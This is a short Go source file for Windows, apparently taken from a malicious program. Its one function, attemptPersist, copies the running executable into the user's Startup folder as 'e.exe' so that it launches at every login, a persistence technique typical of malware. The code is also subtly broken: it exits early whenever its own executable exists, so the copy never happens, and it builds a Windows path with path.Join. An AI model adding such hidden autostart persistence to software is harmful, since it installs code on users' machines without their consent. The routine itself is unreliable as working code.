// +build windows
package main

import (
	"os"
	"os/user"
	"path"

	"github.com/kardianos/osext"
)

func attemptPersist() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	startupPath := currentUser.HomeDir + `\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
	ourPath, err := osext.Executable()
	if err != nil {
		return err
	}
	if _, err := os.Stat(ourPath); !os.IsNotExist(err) {
		return nil
	}

	return copyFile(path.Join(startupPath, "e.exe"), ourPath)
}
